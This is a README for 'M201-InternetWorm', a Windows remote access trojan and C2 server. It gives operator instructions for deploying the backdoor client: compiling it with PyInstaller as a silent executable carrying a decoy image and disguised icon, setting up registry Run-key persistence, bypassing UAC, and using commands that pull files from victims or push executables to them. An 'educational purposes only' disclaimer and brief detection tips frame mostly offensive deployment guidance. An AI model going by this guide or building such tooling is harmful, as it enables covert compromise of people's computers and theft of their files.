# M201-InternetWorm

```
  ██████ ▄▄▄█████▓ ▒█████   ▒█████   ██▓     ██▓    
▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▓██▒    
░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ▒██░    
  ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    ▒██░    
▒██████▒▒  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒░██████▒
▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▓  ░
░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░ ▒  ░
░  ░  ░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░     ░ ░   
      ░               ░ ░      ░ ░      ░  ░    ░  ░

    [+] Advanced RAT with Botnet Capabilities [+]
    [+] For Educational Purposes Only [+]
    [+] Use Responsibly [+]
    [+] Created by iDOR [+]
    [===> CYBERNETIC INFILTRATION SUCCESS <===]
```

## ⚠️ LEGAL DISCLAIMER

**THIS SOFTWARE IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**

- This project is designed for cybersecurity education, penetration testing, and security research
- Usage of this software for attacking targets without prior mutual consent is illegal
- The developers assume no liability and are not responsible for any misuse or damage
- Users are responsible for complying with all applicable local, state, and federal laws
- Only use this software on systems you own or have explicit permission to test

## 📋 Overview

M201-InternetWorm is an advanced Remote Access Tool (RAT) with botnet capabilities designed for cybersecurity professionals, penetration testers, and security researchers. The project consists of two main components:

- **Server (`server.py`)**: Command & Control (C2) server for managing infected clients
- **Client (`reverse.py`)**: Backdoor payload with persistence and stealth capabilities

## 🚀 Features

### Server Features
- **Interactive Command Shell**: Full remote shell access to infected machines
- **File Transfer**: Bidirectional file upload/download capabilities
- **Colorized Interface**: Enhanced user experience with color-coded output
- **Connection Management**: Handle multiple client connections
- **Menu-driven Interface**: Easy-to-use server management

### Client Features
- **Persistent Backdoor**: Automatic startup via Windows registry
- **Stealth Operation**: Silent execution without console windows
- **File Operations**: Upload/download files to/from target system
- **Remote Downloads**: Download files from URLs directly to target
- **Privilege Escalation**: Admin privilege detection and UAC bypass
- **Process Management**: Start programs and execute system commands
- **Decoy Mechanism**: One-time image display for social engineering
- **Error Handling**: Robust exception handling for stability

## 🛠️ Installation

### Prerequisites
```bash
# Python 3.x required
pip install colorama requests pillow

# For Linux icon extraction (optional)
sudo apt install icoutils binutils  # Ubuntu/Debian
```

### Server Setup
1. Clone the repository:
```bash
git clone https://github.com/your-repo/M201-InternetWorm.git
cd M201-InternetWorm
```

2. Run the server:
```bash
python server.py <YOUR_IP> <PORT>
# Example: python server.py 192.168.1.100 4444
```

### Client Deployment

#### Method 1: Direct Execution
```bash
# Edit reverse.py to set your server IP and port (line 162)
python reverse.py
```

#### Method 2: Compiled Executable (Recommended)
```bash
# Install PyInstaller
pip install pyinstaller

# Compile with decoy image
pyinstaller --add-data="decoy_image.jpg:." --onefile --noconsole --icon="icon.ico" reverse.py
```

#### Method 3: Linux Cross-Compilation
```bash
# Using Wine on Linux
wine pyinstaller.exe --add-data="decoy.jpg:." --onefile --noconsole --icon="icon.ico" reverse.py
```

## 📖 Usage

### Starting the Server
1. Run the server script with IP and port:
```bash
python server.py 192.168.1.100 4444
```

2. Select option `1` to start listening for connections

3. Wait for client connections (displays connection info when client connects)

### Available Commands

| Command | Description | Example |
|---------|-------------|---------|
| `client_help` | Display available commands | `client_help` |
| `download <file>` | Download file from target | `download C:\Users\file.txt` |
| `upload <file>` | Upload file to target | `upload payload.exe` |
| `get <url>` | Download file from URL to target | `get http://example.com/file.exe` |
| `check` | Check admin privileges | `check` |
| `start <program>` | Start a program | `start notepad.exe` |
| `cd <directory>` | Change directory | `cd C:\Windows` |
| `exit` | Close connection | `exit` |

### System Commands
Any standard Windows command can be executed:
```bash
dir                    # List directory contents
whoami                 # Show current user
systeminfo             # Display system information
netstat -an            # Show network connections
tasklist               # List running processes
```

## 🔧 Configuration

### Server Configuration
- **IP Address**: Set your server's IP address when starting
- **Port**: Choose an available port (default: 4444)
- **Connection Timeout**: Modify in server.py if needed

### Client Configuration
Edit `reverse.py` line 162 to set your server details:
```python
server('YOUR_SERVER_IP', YOUR_PORT)
```

### Persistence Configuration
The client automatically:
- Copies itself to `%APPDATA%\windows32.exe`
- Adds registry entry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Creates flag file to prevent repeated decoy image display

## 🛡️ Stealth Features

### Anti-Detection
- **No Console Window**: Compiled with `--noconsole` flag
- **Silent Operation**: No debug output or error messages
- **Registry Persistence**: Survives system reboots
- **Exception Handling**: Prevents crashes that could alert users

### Social Engineering
- **Decoy Image**: Displays fake image on first run only
- **Legitimate Icon**: Can be compiled with any icon
- **One-time Execution**: Decoy only shows once to avoid suspicion

## 📁 Project Structure

```
M201-InternetWorm/
├── server.py              # C2 server
├── reverse.py             # Client backdoor
├── extract_ico.py         # Icon extraction utility (Linux)
├── README.md              # This file
└── assets/
    ├── decoy_images/      # Social engineering images
    └── icons/             # Application icons
```

## 🔍 Technical Details

### Communication Protocol
- **Protocol**: TCP sockets with JSON encoding
- **Data Transfer**: Base64 encoding for file transfers
- **Error Handling**: Graceful connection recovery
- **Reconnection**: Automatic reconnection on connection loss

### Persistence Mechanism
1. **File Copy**: Copies executable to `%APPDATA%\windows32.exe`
2. **Registry Entry**: Adds startup entry in Windows registry
3. **Flag File**: Creates `%APPDATA%\img_opened.flag` for one-time decoy

### Supported Platforms
- **Server**: Cross-platform (Windows, Linux, macOS)
- **Client**: Windows-specific (uses Windows registry and APIs)

## 🚨 Detection and Mitigation

### Detection Methods
- **Network Monitoring**: Monitor for suspicious outbound connections
- **Registry Monitoring**: Watch for unauthorized startup entries
- **File System Monitoring**: Monitor %APPDATA% for suspicious files
- **Process Monitoring**: Look for unusual network activity

### Mitigation Strategies
- **Firewall Rules**: Block unauthorized outbound connections
- **Antivirus**: Keep antivirus definitions updated
- **User Education**: Train users about social engineering
- **System Hardening**: Implement proper security policies

## 🧪 Testing Environment

### Recommended Setup
- **Isolated Network**: Use VMs or isolated lab environment
- **Test Machines**: Windows 10/11 virtual machines
- **Network Simulation**: Controlled network environment
- **Monitoring Tools**: Wireshark, Process Monitor, etc.

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly in isolated environment
5. Submit a pull request

## 📜 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🙏 Acknowledgments

- Created for educational purposes in cybersecurity research
- Inspired by legitimate penetration testing tools
- Thanks to the cybersecurity community for responsible disclosure practices

## 📞 Support

For educational use and security research questions:
- Open an issue on GitHub
- Follow responsible disclosure practices
- Use only in authorized testing environments

---

**Remember: With great power comes great responsibility. Use this knowledge to defend, not to attack.**
